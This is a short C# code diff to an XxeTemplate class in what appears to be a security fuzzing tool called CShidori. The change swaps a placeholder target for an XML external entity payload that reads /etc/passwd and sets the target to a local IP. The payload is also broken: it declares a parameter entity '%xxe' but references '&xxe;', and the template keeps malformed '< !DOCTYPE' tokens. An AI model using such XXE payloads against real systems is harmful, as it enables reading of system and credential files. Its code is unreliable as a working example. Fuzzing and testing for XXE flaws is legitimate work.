@@ -10,9 +10,9 @@ namespace CShidori
     {
 
         string target { get; set; }
-        public XxeTemplate(string TemplateType, string param)
+        public XxeTemplate(string TemplateType)
         {
-            this.target = param;
+            this.target = new Misc().GetIp();
             string XXE = string.Empty;
 
 
@@ -21,7 +21,7 @@ namespace CShidori
                  XXE = @"<?xml version=""1.0"" encoding=""UTF - 8""?>
 < !DOCTYPE foo[
 < !ELEMENT foo ANY >
-< !ENTITY xxe SYSTEM ""§TARGET§"" >
+<!ENTITY %xxe SYSTEM ""file:///etc/passwd"" >
 ]
 >
 <foo> &xxe;</foo>";
